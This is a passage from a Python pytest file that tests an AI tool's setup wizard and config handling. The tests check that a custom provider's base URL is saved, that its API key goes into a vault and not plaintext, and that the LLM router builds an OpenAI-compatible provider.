    """`provider_type="custom"` used to save neither the base URL nor the key."""
    import wth_ai.config as cfg_mod
    from wth_ai.cli.setup_wizard import run_setup_wizard
    from wth_ai.vault import SecretVault

    monkeypatch.setenv("WTH_HOME", str(tmp_path))
    cfg_path = tmp_path / "user.yaml"
    monkeypatch.setattr(cfg_mod, "USER_CONFIG_PATH", cfg_path)

    run_setup_wizard(non_interactive={
        "provider_type": "custom",
        "model": "auto",
        "custom_api_key": "sk-local-test",
        "custom_base_url": "http://127.0.0.1:20128/v1",
    })

    text = cfg_path.read_text()
    assert "custom_base_url: http://127.0.0.1:20128/v1" in text
    assert "vault:custom_api_key" in text
    assert "sk-local-test" not in text, "key tidak boleh plaintext di config"
    assert SecretVault().get("custom_api_key") == "sk-local-test"


def test_endpoint_overrides_survive_save_and_reload(tmp_path, monkeypatch):
    """`save_user_config` wrote only custom_base_url, so an openai/anthropic/
    google base URL was silently dropped the next time the config was saved."""
    import wth_ai.config as cfg_mod
    from wth_ai.cli.setup_wizard import run_setup_wizard
    from wth_ai.config import WTHConfig

    monkeypatch.setenv("WTH_HOME", str(tmp_path))
    cfg_path = tmp_path / "user.yaml"
    monkeypatch.setattr(cfg_mod, "USER_CONFIG_PATH", cfg_path)

    run_setup_wizard(non_interactive={
        "provider_type": "openai",
        "model": "gpt-x",
        "openai_base_url": "http://127.0.0.1:8010/v1",
    })

    assert "openai_base_url: http://127.0.0.1:8010/v1" in cfg_path.read_text()
    assert WTHConfig.load().secrets.openai_base_url == "http://127.0.0.1:8010/v1"


def test_router_builds_custom_provider_from_config():
    """End-to-end wiring: `custom` must reach an OpenAICompatProvider pointed at
    the configured base URL, so `wth model test custom` can auto-detect models."""
    from wth_ai.config import ProviderRoleConfig, WTHConfig
    from wth_ai.llm.providers.openai_compat import OpenAICompatProvider
    from wth_ai.llm.router import LLMProviderRouter

    cfg = WTHConfig.load()
    cfg.secrets.custom_base_url = "http://127.0.0.1:20128/v1"
    cfg.secrets.custom_api_key = "sk-local-test"
    cfg.providers["planner"] = ProviderRoleConfig(type="custom", model="auto")

    provider = LLMProviderRouter(cfg)._get_or_create_provider("custom")
    assert isinstance(provider, OpenAICompatProvider)
    assert provider.base_url == "http://127.0.0.1:20128/v1"
    assert provider.name == "custom"

